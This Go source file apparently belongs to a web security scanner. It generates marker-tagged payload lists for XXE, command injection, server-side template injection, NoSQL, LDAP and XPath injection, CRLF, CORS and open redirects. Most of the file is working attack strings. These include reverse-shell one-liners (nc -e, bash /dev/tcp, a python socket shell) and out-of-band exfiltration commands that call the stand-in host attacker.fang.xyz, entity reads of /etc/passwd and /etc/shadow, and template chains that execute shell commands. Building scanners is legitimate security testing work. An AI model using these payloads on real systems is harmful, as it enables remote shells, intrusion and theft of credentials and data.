			Value: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "%s/%%s">%%xxe;]><foo>test</foo><!-- %s -->`, proto, m),
			Check: m, Name: fmt.Sprintf("OOB-%d", n),
		})
	}
	for _, proto := range protocols {
		n++
		m := padMarker("XXEOOB", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %% remote SYSTEM "%s">%%remote;%%remote;]><foo>test</foo><!-- %s -->`, proto, m),
			Check: m, Name: fmt.Sprintf("OOB2-%d", n),
		})
	}
	for _, proto := range protocols[:3] {
		n++
		m := padMarker("XXEOOB", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %% file SYSTEM "file:///etc/passwd"><!ENTITY %% dtd SYSTEM "%s/%%file;">%%dtd;]><foo>test</foo><!-- %s -->`, proto, m),
			Check: m, Name: fmt.Sprintf("OOBExfil-%d", n),
		})
	}
	return p
}

func GenXXESOAPExpandedPayloads() []XXESOAPPayload {
	var p []XXESOAPPayload
	n := 0
	files := []string{"/etc/passwd", "/etc/hosts", "/etc/shadow", "/c:/windows/win.ini"}
	for _, f := range files {
		n++
		m := padMarker("XXESOAP", n)
		p = append(p, XXESOAPPayload{
			Payload: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://%s">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope><!-- %s -->`, f, m),
			Check:   m,
		})
	}
	return p
}

func GenXXEJSONExpandedPayloads() []XXEJSONPayload {
	var p []XXEJSONPayload
	n := 0
	files := []string{
		"/etc/passwd", "/etc/hosts", "/etc/shadow",
		"/c:/windows/win.ini", "/proc/self/environ",
	}
	for _, f := range files {
		n++
		m := padMarker("XXEJSON", n)
		escapedF := strings.ReplaceAll(f, "/", "\\/")
		escapedF = strings.ReplaceAll(escapedF, "\"", "\\\"")
		p = append(p, XXEJSONPayload{
			Payload: fmt.Sprintf(`{"xml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://%s\">]><foo>&xxe;</foo>","check":"%s"}`, escapedF, m),
			Check:   m,
		})
	}
	return p
}

func GenXXESVGXIncludePayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	svgs := []string{
		`<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="100" height="100"><text>&xxe;</text></svg>`,
		`<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><svg>&xxe;</svg>`,
		`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>`,
		`<?xml version="1.0"?><svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg=="/></svg>`,
		`<?xml version="1.0"?><svg xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></svg>`,
	}
	for _, s := range svgs {
		n++
		m := padMarker("XXESVG", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s<!-- %s -->", s, m),
			Check: m, Name: fmt.Sprintf("SVG-%d", n),
		})
	}
	xincludes := []string{
		`<xi:include href="file:///etc/passwd" parse="text"/>`,
		`<xi:include href="php://filter/convert.base64-encode/resource=/etc/passwd"/>`,
		`<xi:include href="http://attacker.fang.xyz/xxe"/>`,
		`<xi:include href="file:///proc/self/environ"/>`,
		`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/><bar>test</bar></foo>`,
		`<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/hosts" parse="text">xi:fallback<xi:fallback>fallback</xi:fallback></xi:include></root>`,
	}
	for _, xi := range xincludes {
		n++
		m := padMarker("XXEXI", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf(`<?xml version="1.0"?>%s<!-- %s -->`, xi, m),
			Check: m, Name: fmt.Sprintf("XInclude-%d", n),
		})
	}
	return p
}

func GenCMDiLinuxExpandedPayloads() []CMDIPayload {
	var p []CMDIPayload
	n := 0
	seps := []string{";", "|", "||", "&&", "`", "$(", "%0a", "%0a%0d"}
	cmds := []string{
		"echo FNGCMDI", "id", "whoami", "uname -a",
		"cat /etc/passwd", "ls -la", "pwd", "hostname",
		"ifconfig", "ip addr", "netstat -an", "ps aux",
		"wget http://attacker.fang.xyz/$(id)",
		"curl http://attacker.fang.xyz/$(id)",
		"nslookup attacker.fang.xyz",
		"dig attacker.fang.xyz",
		"nc -e /bin/sh attacker.fang.xyz 4444",
		"bash -c 'exec bash -i &>/dev/tcp/attacker.fang.xyz/4444 <&1'",
		"python -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker.fang.xyz\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
	}
	for _, sep := range seps {
		for _, cmd := range cmds {
			n++
			m := padMarker("CMDIUN", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("%s%s %s", sep, cmd, m),
				Check: m,
			})
			n++
			m = padMarker("CMDIUN", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("';%s # %s", cmd, m),
				Check: m,
			})
		}
	}
	wrap := []string{
		"$(expr %s)",
		"`expr %s`",
		"$(echo %s)",
		"`echo %s`",
	}
	for _, w := range wrap {
		for _, cmd := range []string{"id", "whoami", "uname"} {
			n++
			m := padMarker("CMDIUN", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf(w+"; %s", fmt.Sprintf("%s %s", cmd, m)),
				Check: m,
			})
		}
	}
	return p
}

func GenCMDiWindowsExpandedPayloads() []CMDIPayload {
	var p []CMDIPayload
	n := 0
	seps := []string{"&", "|", "||", "&&", "%0a", "%0d%0a", ";", "`"}
	cmds := []string{
		"echo FNGCMDI", "whoami", "ver", "ipconfig",
		"systeminfo", "dir C:\\", "type C:\\windows\\win.ini",
		"net user", "netstat -an", "tasklist",
		"powershell -c \"Invoke-WebRequest http://attacker.fang.xyz/$(whoami)\"",
		"certutil -urlcache -f http://attacker.fang.xyz/test",
		"bitsadmin /transfer job http://attacker.fang.xyz/test",
		"nslookup attacker.fang.xyz",
	}
	for _, sep := range seps {
		for _, cmd := range cmds {
			n++
			m := padMarker("CMDIWIN", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("%s%s %s", sep, cmd, m),
				Check: m,
			})
		}
	}
	return p
}

func GenCMDiTimePayloads() []CMDIPayload {
	var p []CMDIPayload
	n := 0
	unixCmds := []string{
		"sleep 1", "sleep 2", "sleep 3", "sleep 5",
		"ping -c 3 127.0.0.1", "ping -c 5 127.0.0.1",
		"read -t 3", "timeout 3",
		"ping -n 3 127.0.0.1",
	}
	for _, sep := range []string{";", "|", "||", "&&", "$(", "`", "%0a"} {
		for _, cmd := range unixCmds {
			n++
			m := padMarker("CMDITM", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("%s%s %s", sep, cmd, m),
				Check: m,
			})
		}
	}
	winCmds := []string{
		"ping -n 3 127.0.0.1", "timeout 3", "ping -n 5 127.0.0.1",
	}
	for _, sep := range []string{"&", "|", "||", "&&", "%0a", "%0d%0a"} {
		for _, cmd := range winCmds {
			n++
			m := padMarker("CMDITM", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("%s%s %s", sep, cmd, m),
				Check: m,
			})
		}
	}
	return p
}

func GenCMDiBlindOOBPayloads() []CMDIPayload {
	var p []CMDIPayload
	n := 0
	oob := []string{
		"nslookup $(hostname).attacker.fang.xyz",
		"nslookup $(id).attacker.fang.xyz",
		"dig $(whoami).attacker.fang.xyz",
		"curl http://attacker.fang.xyz/$(id)",
		"wget --post-data=$(whoami) http://attacker.fang.xyz/",
		"ping -c 1 $(hostname).attacker.fang.xyz",
		"python -c \"import urllib;urllib.urlopen('http://attacker.fang.xyz/'+open('/etc/hostname').read())\"",
		"php -r \"file_get_contents('http://attacker.fang.xyz/' . get_current_user());\"",
		"ruby -e \"require 'net/http';Net::HTTP.get(URI('http://attacker.fang.xyz/'+%x(whoami)))\"",
		"perl -e \"use LWP::Simple;getstore('http://attacker.fang.xyz/' . qx(whoami),'test')\"",
		"nc attacker.fang.xyz 80 -e /bin/sh",
	}
	for _, o := range oob {
		for _, sep := range []string{";", "|", "||", "&&", "$(", "`"} {
			n++
			m := padMarker("CMDIOOB", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("%s%s %s", sep, o, m),
				Check: m,
			})
		}
	}
	return p
}

func GenCMDiWAFBypassPayloads() []CMDIPayload {
	var p []CMDIPayload
	n := 0
	newlines := []string{"%0a", "%0d%0a", "\\n", "\\r\\n", "%0a%0d"}
	for _, nl := range newlines {
		for _, cmd := range []string{"id", "whoami", "cat /etc/passwd"} {
			n++
			m := padMarker("CMDIWF", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("'%s%s %s", nl, cmd, m),
				Check: m,
			})
		}
	}
	hexEnc := []string{
		";echo '", "|echo '", ";printf '", "|printf '",
	}
	for _, enc := range hexEnc {
		n++
		m := padMarker("CMDIWF", n)
		p = append(p, CMDIPayload{
			Value: fmt.Sprintf("%s%s'|xxd", enc, m),
			Check: m,
		})
	}
	b64Enc := []string{
		";echo ", "|echo ", ";printf ", "|printf ",
	}
	for _, enc := range b64Enc {
		n++
		m := padMarker("CMDIWF", n)
		p = append(p, CMDIPayload{
			Value: fmt.Sprintf("%s%s|base64", enc, m),
			Check: m,
		})
	}
	nulls := []string{"%00", "\\x00", "\\\\x00"}
	for _, nb := range nulls {
		for _, sep := range []string{";", "|", "&&"} {
			n++
			m := padMarker("CMDIWF", n)
			p = append(p, CMDIPayload{
				Value: fmt.Sprintf("%s%secho %s", sep, nb, m),
				Check: m,
			})
		}
	}
	return p
}

func GenSSTIJinjaPayloads() []SSTIPayload {
	var p []SSTIPayload
	n := 0
	payloads := []struct {
		val string
		chk string
	}{
		{"{{7*7}}", "49"},
		{"{{7*'7'}}", "7777777"},
		{"{{config}}", "SECRET_KEY"},
		{"{{self}}", "__class__"},
		{"{{request}}", "request"},
		{"{{''.__class__.__mro__[1].__subclasses__()}}", "__subclasses__"},
		{"{{''.__class__.__mro__[2].__subclasses__()}}", "__subclasses__"},
		{"{{lipsum.__globals__['os'].popen('id').read()}}", "uid="},
		{"{{lipsum.__globals__['os'].popen('whoami').read()}}", ""},
		{"{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['os'].popen('id').read()}}", "uid="},
		{"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="},
		{"{{request.application.__globals__['os'].popen('id').read()}}", "uid="},
		{"{{url_for.__globals__['os'].popen('id').read()}}", "uid="},
		{"{{get_flashed_messages.__globals__['os'].popen('id').read()}}", "uid="},
		{"{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid="},
		{"{{joiner.__init__.__globals__.os.popen('id').read()}}", "uid="},
		{"{{namespace.__init__.__globals__.os.popen('id').read()}}", "uid="},
		{"{{config.items()}}", "SECRET_KEY"},
		{"{{''.__class__.__bases__[0].__subclasses__()}}", "__subclasses__"},
	}
	for _, pl := range payloads {
		n++
		m := padMarker("SSTIJIN", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", pl.val, m),
			Check: m,
		})
	}
	for i := 0; i < 20; i++ {
		n++
		m := padMarker("SSTIJIN", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("{{%d*%d}}<!-- %s -->", i+1, i+1, m),
			Check: m,
		})
	}
	for i := 0; i < 20; i++ {
		n++
		m := padMarker("SSTIJIN", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("{{'test'.__class__.__mro__[%d]}}<!-- %s -->", i, m),
			Check: m,
		})
	}
	return p
}

func GenSSTITwigPayloads() []SSTIPayload {
	var p []SSTIPayload
	n := 0
	payloads := []struct {
		val string
		chk string
	}{
		{"{{7*7}}", "49"},
		{"{{7*'7'}}", "49"},
		{"${7*7}", "49"},
		{"#{7*7}", "49"},
		{"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "exec"},
		{"{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}", ""},
		{"{{['id']|map('system')|join(',')}}", "uid="},
		{"{{['cat /etc/passwd']|filter('system')}}", "root:"},
		{"{{app.request.query.filter(0,0,{'CODE':'id'})}}", "uid="},
	}
	for _, pl := range payloads {
		n++
		m := padMarker("SSTITW", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", pl.val, m),
			Check: m,
		})
	}
	return p
}

func GenSSTIFreeMarkerPayloads() []SSTIPayload {
	var p []SSTIPayload
	n := 0
	payloads := []struct {
		val string
		chk string
	}{
		{"${7*7}", "49"},
		{"${7*'7'}", "49"},
		{"#{7*7}", "49"},
		{"${7*7}", "49"},
		{"${7*'7'}", "49"},
		{"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "uid="},
		{"${'freemarker.template.utility.Execute'?new()('id')}", "uid="},
		{"${'freemarker.template.utility.Execute'?new()('cat /etc/passwd')}", "root:"},
		{"<#assign is=object?api.class.getProtectionDomain().getCodeSource().getLocation().openConnection().getInputStream()>${is?api.class.getName()}", "class"},
	}
	for _, pl := range payloads {
		n++
		m := padMarker("SSTIFM", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", pl.val, m),
			Check: m,
		})
	}
	for i := 0; i < 20; i++ {
		n++
		m := padMarker("SSTIFM", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("${%d*%d}<!-- %s -->", i+1, i+1, m),
			Check: m,
		})
	}
	return p
}

func GenSSTIVelocityPayloads() []SSTIPayload {
	var p []SSTIPayload
	n := 0
	payloads := []struct {
		val string
		chk string
	}{
		{"#set($x=7*7)$x", "49"},
		{"$x", "$x"},
		{"#set($x='test')$x", "test"},
		{"#set($str=$class.inspect('java.lang.String').forName('java.lang.Runtime'))#set($rt=$str.getRuntime())$rt.exec('id')", "id"},
		{"#set($e='e')#set($x='x')#set($c='c')#set($cmd='id')#set($ex=$runtime.exec($cmd))", "exec"},
		{"#foreach($i in [1..10])$i#end", "12345678910"},
		{"#set($x=10*5)$x", "50"},
		{"$!{empty.null}", ""},
	}
	for _, pl := range payloads {
		n++
		m := padMarker("SSTIVEL", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", pl.val, m),
			Check: m,
		})
	}
	return p
}

func GenSSTIERBPayloads() []SSTIPayload {
	var p []SSTIPayload
	n := 0
	payloads := []struct {
		val string
		chk string
	}{
		{"<%= 7*7 %>", "49"},
		{"<%= 7*7 %>", "49"},
		{"<% puts 7*7 %>", "49"},
		{"<%= system('id') %>", "uid="},
		{"<%= `id` %>", "uid="},
		{"<%= IO.popen('id').read %>", "uid="},
		{"<%= File.read('/etc/passwd') %>", "root:"},
		{"<% require 'open-uri' %><%= open('http://attacker.fang.xyz').read %>", "attacker"},
		{"<%= eval('7*7') %>", "49"},
		{"<%= 7*7 %>", "49"},
	}
	for _, pl := range payloads {
		n++
		m := padMarker("SSTIERB", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", pl.val, m),
			Check: m,
		})
	}
	return p
}

func GenSSTISmartyPayloads() []SSTIPayload {
	var p []SSTIPayload
	n := 0
	payloads := []struct {
		val string
		chk string
	}{
		{"{7*7}", "49"},
		{"{$smarty.version}", "Smarty"},
		{"{system('id')}", "uid="},
		{"{php}echo 'test';{/php}", "test"},
		{"{literal}{/literal}{system('id')}", "uid="},
		{"{$x=7*7}{$x}", "49"},
		{"{assign var=x value=7*7}{$x}", "49"},
		{"{system('cat /etc/passwd')}", "root:"},
		{"{php}eval('echo 7*7;');{/php}", "49"},
	}
	for _, pl := range payloads {
		n++
		m := padMarker("SSTISM", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", pl.val, m),
			Check: m,
		})
	}
	return p
}

func GenSSTIJadePugPayloads() []SSTIPayload {
	var p []SSTIPayload
	n := 0
	payloads := []struct {
		val string
		chk string
	}{
		{"p=7*7", "49"},
		{"p=\"test\"", "test"},
		{"- var x = 7*7; p=x", "49"},
		{"- var exec = require('child_process').execSync; p(exec('id'))", "uid="},
		{"- var fs = require('fs'); p(fs.readFileSync('/etc/passwd'))", "root:"},
		{"each x in [1,2,3] p=x", "123"},
		{"- var x = 7*7", "49"},
		{"p=global.process.mainModule.require('child_process').execSync('id')", "uid="},
	}
	for _, pl := range payloads {
		n++
		m := padMarker("SSTIJP", n)
		p = append(p, SSTIPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", pl.val, m),
			Check: m,
		})
	}
	return p
}

func GenNoSQLiMongoPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	ops := []string{"$ne", "$gt", "$gte", "$lt", "$lte", "$nin", "$exists", "$type", "$expr"}
	for _, op := range ops {
		for _, val := range []string{"null", "\"\"", "1", "\"admin\"", "\"password\"", "0", "-1"} {
			n++
			m := padMarker("NOSQLMON", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf(`{"%s": %s} <!-- %s -->`, op, val, m),
				Check: m, Name: fmt.Sprintf("Mongo-%s-%s", op, val),
			})
		}
	}
	regexPats := []string{
		".*", "^admin", ".*admin.*", "^a", ".*\\$.*",
		"^[a-z]", ".*(.).*",
	}
	for _, pat := range regexPats {
		n++
		m := padMarker("NOSQLMON", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf(`{"$regex": "%s"} <!-- %s -->`, pat, m),
			Check: m, Name: fmt.Sprintf("Mongo-Regex-%s", pat),
		})
	}
	where := []string{
		"1", "true", "this.constructor",
		"this.password.length>0", "this.username=='admin'",
		"this.role=='admin'", "1==1", "this.__proto__",
	}
	for _, w := range where {
		n++
		m := padMarker("NOSQLMON", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf(`{"$where": "%s"} <!-- %s -->`, w, m),
			Check: m, Name: fmt.Sprintf("Mongo-Where-%s", w),
		})
	}
	funcPats := []string{
		"function(){return true}",
		"function(){return 1==1}",
		"function(){return this.password=='admin'}",
		"function(){return this.role=='admin'}",
		"function(){return this}",
	}
	for _, fp := range funcPats {
		n++
		m := padMarker("NOSQLMON", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf(`{"$func": %s} <!-- %s -->`, fp, m),
			Check: m, Name: fmt.Sprintf("Mongo-Func-%d", n),
		})
	}
	for _, op := range []string{"$ne", "$gt", "$regex"} {
		for _, field := range []string{"username", "password", "role", "token", "email"} {
			n++
			m := padMarker("NOSQLMON", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf(`{"%s": {"%s": null}} <!-- %s -->`, field, op, m),
				Check: m, Name: fmt.Sprintf("Mongo-Field-%s-%s", field, op),
			})
		}
	}
	for i := 0; i < 20; i++ {
		n++
		m := padMarker("NOSQLMON", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf(`' || '1'=='1' // %s`, m),
			Check: m, Name: fmt.Sprintf("Mongo-Injection-%d", i),
		})
	}
	return p
}

func GenNoSQLiCouchbasePayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	couch := []string{
		`'"' && '1'=='1' && '`,
		`'"' || '1'=='1' || '`,
		`"$ne": null`,
		`{"$gt": ""}`,
		`{"$regex": ".*"}`,
		`' || 1==1 || '`,
		`'" && 1==1 && "`,
		`admin' || '1'=='1`,
		`"admin" || "1"=="1"`,
	}
	for _, c := range couch {
		n++
		m := padMarker("NOSQLCB", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", c, m),
			Check: m, Name: fmt.Sprintf("Couchbase-%d", n),
		})
	}
	return p
}

func GenNoSQLiFirebasePayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	firebase := []string{
		`.json`,
		`/.json`,
		`/.json?auth=`,
		`{"$ne":null}`,
		`{"$gt":""}`,
		`{"$regex":".*"}`,
		`"admin"`,
		`"password"`,
		`"role": "admin"`,
		`{"username": {"$ne": null}}`,
		`{"password": {"$ne": null}}`,
		`admin' || '1'=='1`,
		`"admin" || "1"=="1"`,
	}
	for _, f := range firebase {
		n++
		m := padMarker("NOSQLFB", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", f, m),
			Check: m, Name: fmt.Sprintf("Firebase-%d", n),
		})
	}
	return p
}

func GenNoSQLiDynamoPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	dynamo := []string{
		`aws:iam::`,
		`arn:aws:dynamodb:`,
		`AttributeValue`,
		`ExpressionAttributeValues`,
		`KeyConditionExpression`,
		`FilterExpression`,
		`ProjectionExpression`,
		`"ConditionExpression": {"$ne": null}`,
		`"KeyConditionExpression": "username = :val"`,
		`"FilterExpression": "password = :val"`,
		`"ExpressionAttributeValues": {":val": {"S": "admin"}}`,
		`"ExpressionAttributeValues": {":val": {"S": "' OR '1'='1"}}`,
	}
	for _, d := range dynamo {
		n++
		m := padMarker("NOSQLDY", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", d, m),
			Check: m, Name: fmt.Sprintf("Dynamo-%d", n),
		})
	}
	return p
}

func GenLDAPPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	filters := []string{
		"*", "*)(&", "*)(|", "admin*", "admin*)(|",
		"*)(uid=*", "*)(cn=*", "*)(sn=*",
		"*)(objectClass=*)", "*)(objectclass=user",
		"*)(!(objectclass=*))", "*)(|(cn=*))",
		"*)(|(uid=*))", "*)(|(sn=*))",
		"*)(&(uid=*))", "*)(&(cn=*))",
	}
	for _, f := range filters {
		n++
		m := padMarker("LDAPFL", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", f, m),
			Check: m, Name: fmt.Sprintf("LDAP-Filter-%d", n),
		})
	}
	blind := []string{
		"*)(uid=*))(|(uid=*",
		"*)(cn=*))(|(cn=*",
		"admin*)(uid=*))(|(uid=*",
		"admin*)(cn=*))(|(cn=*",
		"*))(|(cn=*",
		"*))(|(uid=*",
	}
	for _, b := range blind {
		n++
		m := padMarker("LDAPBL", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", b, m),
			Check: m, Name: fmt.Sprintf("LDAP-Blind-%d", n),
		})
	}
	errors := []string{
		"*) (&", "*) (|", "*)) (|", "*)) (&",
		"*) !(&", "*) !(|",
		"*)(&", "*)(|",
		"*)(!", "*)(!!",
	}
	for _, e := range errors {
		n++
		m := padMarker("LDAPER", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", e, m),
			Check: m, Name: fmt.Sprintf("LDAP-Error-%d", n),
		})
	}
	return p
}

func GenXPathPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	boolTrue := []string{
		"' or '1'='1", "' or 1=1 or '", "' or 1=1 and '",
		"' or true()", "' or 'a'='a",
		"\" or \"1\"=\"1", "\" or 1=1 or \"",
		"' or 1=1 or '1'='1", "' or 1=1",
	}
	for _, bt := range boolTrue {
		n++
		m := padMarker("XPATHBT", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", bt, m),
			Check: m, Name: fmt.Sprintf("XPath-True-%d", n),
		})
	}
	boolFalse := []string{
		"' and '1'='2", "' and 1=2 and '", "' and false()",
		"' and 'a'='b", "\" and \"1\"=\"2",
		"' and 1=0", "' or '1'='2",
	}
	for _, bf := range boolFalse {
		n++
		m := padMarker("XPATHBF", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", bf, m),
			Check: m, Name: fmt.Sprintf("XPath-False-%d", n),
		})
	}
	errorXpath := []string{
		"'", "\"", "')", "'))", "' and 1=0 and '",
		"' | //*", "' | /", "' | //user",
		"'/*", "'] | //* | //*[",
		"\"/*", "'] | //user/* | //*[",
	}
	for _, e := range errorXpath {
		n++
		m := padMarker("XPATHER", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", e, m),
			Check: m, Name: fmt.Sprintf("XPath-Error-%d", n),
		})
	}
	outofband := []string{
		"' and doc('http://attacker.fang.xyz/xpath')",
		"' and doc(concat('http://attacker.fang.xyz/', 'test'))",
		"' and doc('ftp://attacker.fang.xyz/xpath')",
		"' and unparsed-text('http://attacker.fang.xyz/xpath')",
		"' and doc-available('http://attacker.fang.xyz/xpath')",
	}
	for _, oob := range outofband {
		n++
		m := padMarker("XPATHOB", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", oob, m),
			Check: m, Name: fmt.Sprintf("XPath-OOB-%d", n),
		})
	}
	return p
}

func GenCRLFInjectionPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	crlfs := []string{
		"%0d%0a", "%0a%0d", "%0a", "%0d",
		"\\r\\n", "\\n\\r", "\\n", "\\r",
		"%00%0d%0a", "%0d%0a%00",
		"Test: x%0d%0aX-Forwarded-For: 127.0.0.1",
		"%0d%0aSet-Cookie: session=injected",
		"%0d%0aLocation: http://evil.fangtest.com",
		"%0d%0aX-XSS-Protection: 0",
		"%0d%0aContent-Length: 0",
		"%0d%0a%0d%0a<html><script>alert(1)</script>",
	}
	for _, c := range crlfs {
		n++
		m := padMarker("CRLF", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s<!-- %s -->", c, m),
			Check: m, Name: fmt.Sprintf("CRLF-%d", n),
		})
	}
	return p
}

func GenCORSPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	origins := []struct {
		origin string
		name   string
	}{
		{"https://evil.fangtest.com", "Arbitrary Origin"},
		{"null", "Null Origin"},
		{"https://attack.fangtest.com", "Alt Domain"},
		{"https://evil.fangtest.com.evil.com", "Subdomain"},
		{"https://evil.com", "Unrelated"},
		{"file://", "File Protocol"},
		{"http://evil.fangtest.com", "HTTP Variant"},
		{"https://evilevil.fangtest.com", "Prefix Evil"},
		{"http://evil.fangtest.com:8080", "Non-standard port"},
		{"https://evil.fangtest.com@evil.com", "Userinfo bypass"},
		{"https://evil.fangtest.com/", "Trailing slash"},
		{"https://api.fangtest.com", "API Origin"},
	}
	for _, o := range origins {
		n++
		m := padMarker("CORS", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s --> [%s]", o.origin, m, o.name),
			Check: m, Name: fmt.Sprintf("CORS-%s", o.name),
		})
	}
	return p
}

func GenOpenRedirectPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	params := []string{
		"url", "redirect", "next", "return", "rurl", "dest",
		"destination", "redir", "redirect_uri", "redirect_url",
		"continue", "go", "out", "view", "to", "link", "uri",
		"path", "ref", "referer", "return_url", "return_to",
		"return_path", "redirect_to", "target", "u", "q",
		"site", "page", "load", "file", "document", "location",
		"src", "source", "forward", "callback", "return_path",
		"c", "dir", "data", "domain", "host", "hostname",
		"href", "loc", "login", "logout", "nav", "navigate",
		"new_url", "origin", "redirect_uri", "request",
		"response", "ret", "r", "referrer", "refferer",
		"returnTo", "returnUrl", "return_url_1", "ru",
	}
	for _, pn := range params {
		n++
		m := padMarker("ORP", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s=%s", pn, m),
			Check: m, Name: fmt.Sprintf("RedirectParam-%s", pn),
		})
	}
	return p
}

func GenOpenRedirectURLs() []PayloadDef {
	var p []PayloadDef
	n := 0
	urls := []string{
		"https://evil.fangtest.com/phish",
		"//evil.fangtest.com/phish",
		"http://evil.fangtest.com",
		"https://evil.fangtest.com",
		"///evil.fangtest.com",
		"https:evil.fangtest.com",
		"http:evil.fangtest.com",
		"//evil.fangtest.com:8080/phish",
		"https://evil.fangtest.com.evil.com/phish",
		"https://evil.fangtest.com@evil.com/phish",
		"https://evil.fangtest.com\\@evil.com",
		"https://evil.fangtest.com/evil.com",
		"javascript:alert(1)",
		"javascript:void(0)",
		"data:text/html,<script>alert(1)</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		"vbscript:msgbox(1)",
		"file:///etc/passwd",
		"ftp://evil.fangtest.com",
		"gopher://evil.fangtest.com:80/_",
		"dict://evil.fangtest.com:1337/",
		"\\\\evil.fangtest.com\\share",
		"//evil.fangtest.com\\share",
		"http://0",
		"http://0x0",
		"http://0177.0.0.1",
		"http://127.0.0.1.nip.io",
		"http://127.0.0.1.xip.io",
		"http://169.254.169.254",
		"http://2130706433",
		"http://0x7f000001",
		"http://0x7f.0x0.0x0.0x1",
		"http://[::1]",
		"http://[::ffff:127.0.0.1]",
		"/\\evil.fangtest.com",
		"http://evil.fangtest.com%2f@evil.com",
		"http://evil.fangtest.com%23@evil.com",
		"http://evil.fangtest.com%0a@evil.com",
	}
	for _, u := range urls {
		n++
		m := padMarker("ORU", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", u, m),
			Check: m, Name: fmt.Sprintf("RedirectURL-%d", n),
		})
	}
	return p
}
